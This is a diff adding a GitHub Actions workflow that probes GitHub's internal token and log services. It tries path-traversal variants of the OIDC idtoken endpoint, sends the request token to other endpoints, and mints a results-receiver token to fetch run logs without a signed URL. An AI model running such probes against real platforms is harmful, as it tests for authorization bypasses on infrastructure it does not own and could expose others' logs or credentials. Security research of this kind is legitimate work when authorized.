@@ -1,0 +1,63 @@
+name: redirect-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe run-actions service redirect destinations
+        run: |
+          HOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
+          echo "Host: $HOST"
+
+          echo ""
+          echo "=== Get redirect destinations ==="
+          for path in \
+            "/1//idtoken" "/188//idtoken" "/999//idtoken" \
+            "/188/idtoken" "/188/./idtoken" "/188/%2f%2fidtoken"; do
+            # Follow no redirects to see the destination
+            RESP=$(curl -si -m 5 "$HOST$path" 2>/dev/null | head -10)
+            echo "Path: $path"
+            echo "$RESP" | grep -E "HTTP/|location:|Location:"
+            echo "---"
+          done
+
+          echo ""
+          echo "=== Follow redirects and see what we get ==="
+          RESP=$(curl -siL -m 10 "$HOST/188//idtoken" 2>/dev/null | head -15)
+          echo "$RESP"
+
+          echo ""
+          echo "=== Check /health with auth token ==="
+          curl -si "$HOST/health" \
+            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" 2>/dev/null | head -10
+
+      - name: Get current run's internal log UUID
+        run: |
+          echo "=== Get this run's internal UUID ==="
+          # The signed log URL contains the internal UUID
+          # We need to request it via the API - let's use GITHUB_TOKEN
+          LOGS_URL=$(curl -si -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/logs" 2>/dev/null \
+            | grep -i "location:" | awk '{print $2}' | tr -d '\r')
+          echo "Log URL: $LOGS_URL"
+
+          # Extract the internal UUID from the URL
+          INTERNAL_UUID=$(echo "$LOGS_URL" | grep -oP 'runs/\K[a-f0-9-]+')
+          echo "Internal UUID: $INTERNAL_UUID"
+
+          echo ""
+          echo "=== Try accessing this run's logs with OIDC token (no signature) ==="
+          RR_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=results-receiver.actions.githubusercontent.com" | jq -r .value)
+
+          # Try with OIDC token (no signature in URL)
+          curl -si -H "Authorization: Bearer $RR_TOKEN" \
+            "https://results-receiver.actions.githubusercontent.com/rest/runs/$INTERNAL_UUID/logs" 2>/dev/null | head -5
+
+          echo ""
+          echo "=== Try /rest redirect destination ==="
+          curl -siL -m 5 \
+            "https://results-receiver.actions.githubusercontent.com/rest" 2>/dev/null | head -10
